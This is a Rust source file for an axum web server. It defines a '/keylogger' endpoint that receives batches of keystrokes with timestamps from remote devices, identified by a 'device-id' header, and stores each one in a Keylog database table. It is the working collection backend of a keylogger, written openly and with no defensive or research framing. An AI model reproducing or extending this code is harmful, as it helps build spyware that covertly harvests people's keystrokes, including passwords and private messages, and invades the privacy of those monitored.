use axum::{Json, extract::State, http::HeaderMap};
use chrono::NaiveDateTime;
use utoipa::ToSchema;
use uuid::Uuid;

use crate::{AppState, Error};

#[derive(serde::Deserialize, ToSchema)]
#[schema(as = Post::KeyLogger::Req)]
pub struct Req {
    pub keys: Vec<Key>,
}

#[derive(serde::Deserialize, ToSchema)]
#[schema(as = Post::KeyLogger::Req::Key)]
pub struct Key {
    pub at: NaiveDateTime,
    pub key_pressed: String,
}

#[utoipa::path(
    post,
    path = "/keylogger",
    request_body = Req,
    responses(
        (status = 200, description = "inserted keylogger in db"),
    ),
    params(
      ("device-id" = String, Header, description = "Device id"),
    ),
    tag = "Keylogger",
)]
#[axum::debug_handler]
pub async fn post_keylogger(
    headers: HeaderMap,
    State(app_state): State<AppState>,
    Json(req): Json<Req>,
) -> Result<(), Error> {
    let mut handles = vec![];
    let device_id = headers
        .get("device-id")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");

    for key in req.keys.into_iter() {
        let db_pool = app_state.db_pool.clone();
        let device_id = device_id.to_owned();
        let handle = tokio::spawn(async move {
            let keylog_id = Uuid::new_v4();
            sqlx::query!(
                r#"
                    INSERT INTO Keylog
                        (keylog_id, device_id, key, created_at)
                        VALUES ($1, $2, $3, $4)
                    ;
                "#,
                keylog_id,
                device_id,
                &key.key_pressed,
                &key.at,
            )
            .execute(&db_pool)
            .await
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await??;
    }

    Ok(())
}
